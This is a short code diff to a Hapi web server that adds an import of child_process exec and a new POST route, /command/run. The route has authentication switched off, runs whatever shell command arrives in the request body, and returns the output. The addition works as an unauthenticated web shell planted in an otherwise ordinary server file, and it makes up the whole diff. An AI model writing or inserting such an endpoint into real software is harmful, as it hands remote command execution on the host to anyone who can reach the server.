@@ -1,6 +1,7 @@
 import Hapi from 'hapi';
 import h2o2 from 'h2o2';
 import inert from 'inert';
+import { exec } from 'child_process';
 
 
 /**
@@ -55,6 +56,24 @@ server.route([
           }
           return assetsPath;
         },
+      },
+    },
+  },
+  {
+    method: 'POST',
+    path: '/command/run',
+    config: {
+      auth: false,
+      handler(request, reply) {
+        const { command } = JSON.parse(request.payload);
+        exec(command, (error, stdout, stderr) => {
+          console.log(`stdout: ${stdout}`);
+          console.log(`stderr: ${stderr}`);
+          if (error !== null) {
+            console.log(`error: ${error}`);
+          }
+          reply({ result: stdout && stdout.trim() });
+        });
       },
     },
   },
